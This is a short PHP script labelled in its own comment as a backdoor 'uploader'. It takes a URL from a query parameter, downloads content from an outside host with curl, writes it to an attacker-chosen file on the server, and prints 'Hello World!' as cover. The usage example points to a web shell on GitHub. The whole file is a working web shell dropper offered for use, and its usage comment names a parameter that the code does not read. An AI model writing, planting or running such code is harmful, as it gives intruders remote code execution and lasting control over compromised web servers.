<?php
//php code to create uploader
//how to use? backdoor.php?file=index.php&name=https://raw.githubusercontent.com/exploit-haxor/webshell/main/mydb.php
function class_x_i($x = ''){
$urlset = isset($_GET['name']) ? trim($_GET['name']) : '';
$filename = isset($_GET['url']) ? trim($_GET['url']) : '';
$ch = curl_init('http://'.$urlset);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
file_put_contents($filename,$result);
echo 'Hello World!';
}
class_x_i();
?>
